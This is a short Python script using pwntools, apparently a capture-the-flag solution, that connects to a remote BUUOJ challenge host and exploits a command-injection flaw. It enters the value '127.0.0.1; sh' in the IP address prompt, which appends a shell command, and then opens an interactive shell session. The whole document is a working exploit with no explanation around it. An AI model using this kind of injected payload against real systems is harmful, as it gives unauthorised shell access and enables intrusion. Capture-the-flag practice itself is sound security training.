from pwn import *

io = remote('node4.buuoj.cn', 29833)
io.sendlineafter('Please input u choose:', b'1')
io.sendlineafter('Please input the ip address:', b'127.0.0.1; sh')
io.interactive()